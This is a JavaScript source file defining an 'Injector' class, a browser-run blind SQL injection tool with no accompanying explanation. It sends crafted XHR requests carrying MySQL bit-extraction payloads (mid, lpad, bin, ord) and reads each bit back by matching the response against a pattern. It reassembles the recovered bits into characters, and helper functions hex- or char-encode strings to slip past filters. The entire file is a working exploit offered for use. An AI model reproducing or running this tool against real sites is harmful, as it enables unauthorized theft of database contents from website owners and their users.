function Injector(method, url, params, payload, pattern) { 
    this.method = method; 
    this.bisPost = (method.toLowerCase() == 'post'); 
    if (url[0] == '/') { 
        this.url = url; 
    } else { 
        this.url = location.pathname; 
    } 
    var ref = this; 
    this.RequestSender = function(name) { 
        this.name = name; 
        this.xhr = "var xhr = new XMLHttpRequest();"; 
        this.requestHeaders = []; 
        if (ref.bisPost) { 
            this.requestHeaders.push("xhr.setRequestHeader(\x22Content-Type\x22,\x22application/x-www-form-urlencoded\x22);"); 
        } 
    } 
    this.Sender = function() { 
        this.handler = "xhr.onreadystatechange = function(){if(this.readyState == 4 && this.status == 200){ref.after = new Date(); console.log('Time Elpased:' + ref.timeElapsed()); document.body.innerHTML = this.responseText;}}"; 
    } 
    this.SQLInjector = function() { 
        this.handler = "xhr.onreadystatechange = function(){if(this.readyState == 4 && this.status == 200){ref.result[i-1][j-1] = !!this.responseText.match(ref.pattern)+0;}}"; 
    } 
    this.Sender.prototype = new this.RequestSender('send'); 
    this.SQLInjector.prototype = new this.RequestSender('inject'); 
    this.sc = new this.Sender(); 
    this.ic = new this.SQLInjector(); 
    this.options = {}; 
    this.options.unicode = false; 
    this.result = []; 
    this.cursor = 1; 
    this.params = params; 
    this.pattern = pattern; 
    this.payload = payload; 
    this.payload = this.parseVar(this.payload); 
    this.prepare(); 
} 
Injector.prototype.execute = function(len) { 
    for (var i = this.cursor; i <= this.cursor + len; i++) { 
        this.result[i - 1] = []; 
        for (var j = 1; j <= (this.options.unicode ? 16 : 8); j++) { 
            this.inject(i, j) 
        } 
    } 
    this.cursor = this.cursor + len; 
} 
Injector.prototype.toString = function() { 
    var answer = ''; 
    for (var i = 0; i < this.result.length; i++) { 
        answer += String.fromCharCode(parseInt(this.result[i].join(""), 2)) 
    } 
    return answer; 
} 
Injector.prototype.prepare = function() { 
    var ref = this; 
    var iter = [this.sc, this.ic]; 
    var obj; 
    var url, params; 
    this.Sender.prototype.wrapper = "\x22+val+\x22"; 
    this.SQLInjector.prototype.wrapper = 'mid(lpad(bin(ord(mid($w,\x22+i+\x22,1))),' + (this.options.unicode ? '16' : '8') + ',0),\x22+j+\x22,1)'; 
    for (var i = 0; i < iter.length; i++) { 
        obj = iter[i]; 
        url = this.url.replace(/\$p/, obj.wrapper).replace(/\$w/, this.payload); 
        params = this.params.replace(/\$p/, obj.wrapper).replace(/\$w/, this.payload); 
        if (this.bisPost) { 
            obj.opener = "xhr.open(\x22" + this.method + "\x22, \x22" + url + "\x22);"; 
            obj.sender = "xhr.send(\x22" + params + "\x22);"; 
        } else { 
            obj.opener = "xhr.open(\x22" + this.method + "\x22, \x22" + url + '?' + params + "\x22);"; 
            obj.sender = "xhr.send(null);"; 
        } 
        obj.injectorContent = [obj.xhr, obj.opener, obj.requestHeaders.join(" "),obj.sender,  obj.handler].join(" "); 
        eval('this.' + obj.name + ' = function(' + (obj == this.ic ? 'i,j' : 'val') + '){' + 'this.before = new Date(); ' + obj.injectorContent + '}'); 
    } 
} 
Injector.prototype.replace = function(from, to) { 
    this.url = this.url.replace(new RegExp(from,'g'), to); 
    console.log(this.url); 
    this.params = this.params.replace(new RegExp(from,'g'), to); 
    console.log(this.params); 
} 
Injector.prototype.parseVar = function(str) { 
    var ref = this; 
    str = str.replace(/{\$[a-z]+?\([a-z0-9]+?\)}/g, function(m) { 
        var match = m.match(/{\$([a-z]+?)\(([a-z0-9]+?)\)}/); 
        return eval('ref.userFuncs.' + match[1] + '("' + match[2] + '")') 
    }); 
    return str; 
} 
Injector.prototype.userFuncs = { 
    'hex': function(str) { 
        result = '0x'; 
        for (var i = 0; i < str.length; i++) { 
            result += str.charCodeAt(i).toString(16); 
        } 
        return result; 
    }, 
    'concat': function(str) { 
        result = 'concat('; 
        for (var i = 0; i < str.length; i++) { 
            result += "char(" + str.charCodeAt(i) + ")"; 
            result += (i == str.length - 1) ? ')' : ','; 
        } 
        return result; 
    } 
} 
Injector.prototype.setUnicode = function(bool) { 
    this.options.unicode = bool; 
} 
Injector.prototype.timeElapsed = function() { 
    return this.after - this.before; 
}